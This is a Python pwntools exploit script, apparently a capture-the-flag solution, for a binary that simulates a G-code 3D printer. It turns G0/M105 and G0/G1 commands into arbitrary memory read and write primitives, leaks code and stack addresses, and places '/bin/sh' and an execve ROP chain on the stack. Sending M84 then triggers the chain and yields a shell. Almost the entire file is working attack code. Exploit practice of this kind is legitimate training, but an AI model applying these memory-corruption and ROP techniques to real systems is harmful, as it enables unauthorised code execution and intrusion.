#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./youwouldntdownloada3dprinter
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './youwouldntdownloada3dprinter')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled

# python version 3.13.2
# pwntools version 4.14.0

io = start()

# Read byte at coordinate (x, y, z)
def read_xyz(x, y, z):
  # Uses the G0 command to move to the specified coordinates
  # and the M105 command to read value at the current position
  payload = b""
  payload += f"G0 X{x} Y{y} Z{z}\n".encode()
  payload += b"M105"
  
  # G0 X[z] Y[y] Z[z]
  #  > Rapidly setting position to ([x], [y], [z]) 0
  # M105
  #  > ok T:0 B:0 V:[value]
  
  io.sendline(payload)
  io.recvuntil(b"V:")
  return int(io.recvline().strip())

# Read byte at offset
def read_byte(offset):
  return read_xyz(0, 0, offset)

# Read 64 bit value at offset
def read_64(offset):
  value = 0
  for i in range(8):
    byte = read_byte(offset + i)
    value |= (byte & 0xFF) << (i * 8)
  return value

# Add a byte value at coordinate (x, y, z)
def add_xyze(x, y, z, e):
  # Uses the G0 command to move to the specified coordinates
  # and the G1 command to write value at the same position
  payload = b""
  payload += f"G0 X{x} Y{y} Z{z}\n".encode()
  payload += f"G1 X{x} Y{y} Z{z} E{e}".encode()
  
  # G0 X[x] Y[y] Z[z]
  #  > Rapidly setting position to ([x], [y], [z]) 0
  # G1 X[x] Y[y] Z[z] E[e]
  #  > Linearly setting position to ([x], [y], [z]) 0
  
  io.sendline(payload)

# Write byte at offset
def write_byte(offset, value):
  # Sums the difference between the previous byte and the new byte  
  prev_byte = read_byte(offset)
  if (prev_byte == value):
    return
    
  if (prev_byte > value):
    new_byte = 0x100 - prev_byte + value
  else:
    new_byte = value - prev_byte
  
  add_xyze(0, 0, offset, new_byte)

# Write bytes starting from offset
def write_bytes(offset, data):
  for i in range(len(data)):
    write_byte(offset + i, data[i])

# Write 64 bit value at offset
def write_64(offset, value):
  for i in range(8):
    value_byte = (value >> (i * 8)) & 0xFF      
    write_byte(offset + i, value_byte)

io.recvuntil(b"> Enter G-code:\n")

text_leak = read_64(0xEE6B28) # offset for a .text address  
stack_leak = read_64(-0x8) # offset for a stack address

elf_base = text_leak - 0x18D60 # elf base address
array_base = elf_base + 0x50008 # base address used for the binary reading and writing operations
target_addr = stack_leak - 0xF8 # return address for an arbitrary function, target address for placing the ROP chain

exe.address = elf_base
rop_chain = ROP(exe, base=target_addr)

# Build the rop chain for execve("/bin/sh"),
# used raw syscall gadget to prevent pwntools from using sigreturn
syscall = rop_chain.find_gadget(["syscall", "ret"])[0]

rop_chain.rax = constants.SYS_execve
rop_chain.rdi = array_base # address of "/bin/sh"
rop_chain.rsi = 0
rop_chain.rdx = 0
rop_chain.raw(syscall)

write_bytes(0, b"/bin/sh") # write "/bin/sh" string to the array base
write_bytes(target_addr - array_base, rop_chain.chain()) # write the rop chain to the target address

# Command for finishing the execution, triggering the rop chain
io.sendline(b"M84")
io.recvuntil(b"\n")

log.success("Got shell")
io.interactive()
